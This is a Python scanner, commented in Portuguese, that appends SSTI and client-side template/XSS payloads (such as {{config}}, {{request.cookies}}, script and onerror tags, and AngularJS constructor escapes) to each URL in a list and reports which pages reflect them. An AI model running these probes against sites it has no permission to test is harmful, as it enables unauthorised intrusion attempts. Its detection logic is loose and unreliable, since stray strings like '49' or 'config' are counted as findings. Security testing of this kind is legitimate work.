import requests
from urllib.parse import quote

# Cores para terminal
class Colors:
    GREEN = '\033[92m'  # Verde
    RED = '\033[91m'    # Vermelho
    YELLOW = '\033[93m'  # Amarelo
    RESET = '\033[0m'   # Resetar cor

# Payloads comuns para SSTI e CSTI
SSTI_PAYLOADS = [
    "{{7*7}}",
    "{{config}}",
    "{{self}}",
    "{{'{{'}}",
    "{{request.headers}}",
    "{{request.cookies}}",
    "{{'{{' + '}}'}}",  # Payload de concatenação
    "{{ (7 * 7) }}",  # Formato diferente
    "{{ 'test' }}",  # Payload básico para teste
    "{{ (''.join(['H','e','l','l','o'])) }}",  # Teste de manipulação
]

CSTI_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "{{alert(1)}}",
    "{{'{{'}}",
    "{{document.cookie}}",
    "<svg/onload=alert(1)>",  # Teste com SVG
    # Novos payloads de CSTI
    "{{$on.constructor('alert(1)')()}}",
    "{{constructor.constructor('alert(1)')()}}",
    "{{_openBlock.constructor('alert(1)')()}}",
    "[self.alert(1)mod1]",
    "[self.alert(1)]",
    "[(1,alert)(1)]",
]

# Funções de verificação
def test_ssti(url, payload):
    try:
        response = requests.get(url + payload, timeout=5)
        if response.status_code == 200:
            # Verifica se a resposta reflete o payload ou fornece um resultado significativo
            if payload in response.text or "49" in response.text or "config" in response.text:
                return f"{Colors.GREEN}[+] Vulnerabilidade SSTI encontrada em {url + payload}{Colors.RESET}"
            elif "error" not in response.text and len(response.text) < 500:  # Evita mensagens de erro comuns
                return f"{Colors.YELLOW}[-] Possível SSTI em {url + payload} (sem confirmação clara){Colors.RESET}"
    except requests.RequestException as e:
        return f"{Colors.RED}[!] Erro ao acessar {url + payload}: {e}{Colors.RESET}"

def test_csti(url, payload):
    try:
        response = requests.get(url + payload, timeout=5)
        if response.status_code == 200:
            # Verifica se o conteúdo refletido é realmente um script executável
            if "<script>alert(1)</script>" in response.text or "alert(1)" in response.text:
                return f"{Colors.GREEN}[+] Vulnerabilidade CSTI encontrada em {url + payload}{Colors.RESET}"
            elif "<img" in response.text or "<svg" in response.text:
                return f"{Colors.YELLOW}[-] Possível CSTI em {url + payload} (mas sem confirmação clara){Colors.RESET}"
    except requests.RequestException as e:
        return f"{Colors.RED}[!] Erro ao acessar {url + payload}: {e}{Colors.RESET}"

def check_url(url):
    results = []

    # Testa para SSTI
    for payload in SSTI_PAYLOADS:
        encoded_payload = quote(payload)  # Codificando o payload
        result = test_ssti(url, encoded_payload)
        if result:
            results.append(result)

    # Testa para CSTI
    for payload in CSTI_PAYLOADS:
        encoded_payload = quote(payload)  # Codificando o payload
        result = test_csti(url, encoded_payload)
        if result:
            results.append(result)

    return results

def main(file_path):
    try:
        with open(file_path, "r") as file:
            urls = file.read().splitlines()
    except FileNotFoundError:
        print(f"{Colors.RED}[Erro] Arquivo não encontrado: {file_path}. Verifique o caminho e tente novamente.{Colors.RESET}")
        return

    print(f"Iniciando verificação de SSTI e CSTI nas URLs do arquivo: {file_path}\n")
    
    # Resumo de vulnerabilidades encontradas
    total_vulnerabilities = 0

    for url in urls:
        print(f"Verificando URL: {url}")
        
        # Testa SSTI e CSTI
        results = check_url(url)
        for result in results:
            print(result)
            total_vulnerabilities += 1

    print(f"\nVerificação concluída. Total de vulnerabilidades encontradas: {total_vulnerabilities}")

if __name__ == "__main__":
    file_path = input("URLs File: ")
    main(file_path)
